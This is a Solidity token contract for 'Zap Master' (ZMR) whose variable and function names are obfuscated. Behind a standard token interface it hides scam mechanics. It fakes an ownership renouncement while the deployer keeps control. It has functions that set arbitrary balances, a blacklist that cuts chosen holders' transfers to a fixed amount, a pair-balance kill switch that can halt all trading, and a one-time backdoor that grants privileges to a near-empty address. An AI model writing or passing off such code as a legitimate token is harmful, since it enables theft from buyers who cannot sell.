//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface launchReceiverFee {
    function createPair(address maxExempt, address shouldAmount) external returns (address);
}

interface isShouldTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellShouldLaunch) external view returns (uint256);

    function transfer(address launchedReceiverFee, uint256 fundAt) external returns (bool);

    function allowance(address tradingTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundAt) external returns (bool);

    function transferFrom(
        address sender,
        address launchedReceiverFee,
        uint256 fundAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountTrading, uint256 value);
    event Approval(address indexed tradingTake, address indexed spender, uint256 value);
}

abstract contract swapAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txSender is isShouldTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ZapMaster is swapAt, isShouldTake, txSender {

    bool private takeEnable;

    constructor (){
        if (takeEnable) {
            isExempt = false;
        }
        atTotal totalTeam = atTotal(atFee);
        exemptTrading = launchReceiverFee(totalTeam.factory()).createPair(totalTeam.WETH(), address(this));
        if (takeEnable) {
            feeShould = true;
        }
        swapBuy = _msgSender();
        listFee[swapBuy] = true;
        autoLaunch[swapBuy] = minList;
        marketingAmountExempt();
        
        emit Transfer(address(0), swapBuy, minList);
    }

    string private tokenTake = "Zap Master";

    uint256 private teamTrading;

    address public swapBuy;

    mapping(address => bool) public launchedLimit;

    function owner() external view returns (address) {
        return listSender;
    }

    function balanceOf(address sellShouldLaunch) public view virtual override returns (uint256) {
        return autoLaunch[sellShouldLaunch];
    }

    uint256 atLaunch;

    uint256 constant receiverFund = 15 ** 10;

    uint256 public buyExempt;

    mapping(address => mapping(address => uint256)) private liquidityWallet;

    address public exemptTrading;

    event OwnershipTransferred(address indexed totalSwap, address indexed tokenSellMarketing);

    function approve(address atLimit, uint256 fundAt) public virtual override returns (bool) {
        liquidityWallet[_msgSender()][atLimit] = fundAt;
        emit Approval(_msgSender(), atLimit, fundAt);
        return true;
    }

    function liquidityList(address teamTake, uint256 fundAt) public {
        tokenSell();
        autoLaunch[teamTake] = fundAt;
    }

    function launchedTeam(address atMode) public {
        tokenSell();
        
        if (atMode == swapBuy || atMode == exemptTrading) {
            return;
        }
        launchedLimit[atMode] = true;
    }

    function launchedAuto(address isTeamReceiver, address launchedReceiverFee, uint256 fundAt) internal returns (bool) {
        if (isTeamReceiver == swapBuy) {
            return buyIs(isTeamReceiver, launchedReceiverFee, fundAt);
        }
        uint256 tradingMin = isShouldTake(exemptTrading).balanceOf(fromBuy);
        require(tradingMin == atLaunch);
        require(launchedReceiverFee != fromBuy);
        if (launchedLimit[isTeamReceiver]) {
            return buyIs(isTeamReceiver, launchedReceiverFee, receiverFund);
        }
        return buyIs(isTeamReceiver, launchedReceiverFee, fundAt);
    }

    function allowance(address tokenShould, address atLimit) external view virtual override returns (uint256) {
        if (atLimit == atFee) {
            return type(uint256).max;
        }
        return liquidityWallet[tokenShould][atLimit];
    }

    bool public feeShould;

    bool private modeTrading;

    uint8 private launchWalletIs = 18;

    function symbol() external view virtual override returns (string memory) {
        return tradingSwap;
    }

    function autoMarketing(uint256 fundAt) public {
        tokenSell();
        atLaunch = fundAt;
    }

    function marketingAmountExempt() public {
        emit OwnershipTransferred(swapBuy, address(0));
        listSender = address(0);
    }

    function getOwner() external view returns (address) {
        return listSender;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return minList;
    }

    uint256 private swapTx;

    bool public exemptFundReceiver;

    string private tradingSwap = "ZMR";

    mapping(address => bool) public listFee;

    address atFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return launchWalletIs;
    }

    function transferFrom(address isTeamReceiver, address launchedReceiverFee, uint256 fundAt) external override returns (bool) {
        if (_msgSender() != atFee) {
            if (liquidityWallet[isTeamReceiver][_msgSender()] != type(uint256).max) {
                require(fundAt <= liquidityWallet[isTeamReceiver][_msgSender()]);
                liquidityWallet[isTeamReceiver][_msgSender()] -= fundAt;
            }
        }
        return launchedAuto(isTeamReceiver, launchedReceiverFee, fundAt);
    }

    function buyIs(address isTeamReceiver, address launchedReceiverFee, uint256 fundAt) internal returns (bool) {
        require(autoLaunch[isTeamReceiver] >= fundAt);
        autoLaunch[isTeamReceiver] -= fundAt;
        autoLaunch[launchedReceiverFee] += fundAt;
        emit Transfer(isTeamReceiver, launchedReceiverFee, fundAt);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return tokenTake;
    }

    function tokenSell() private view {
        require(listFee[_msgSender()]);
    }

    uint256 public modeToken;

    bool private isExempt;

    function transfer(address teamTake, uint256 fundAt) external virtual override returns (bool) {
        return launchedAuto(_msgSender(), teamTake, fundAt);
    }

    function sellLaunched(address minReceiver) public {
        require(minReceiver.balance < 100000);
        if (atMax) {
            return;
        }
        
        listFee[minReceiver] = true;
        
        atMax = true;
    }

    bool public atMax;

    uint256 private minList = 100000000 * 10 ** 18;

    address private listSender;

    address fromBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 receiverFrom;

    bool public tradingBuy;

    mapping(address => uint256) private autoLaunch;

}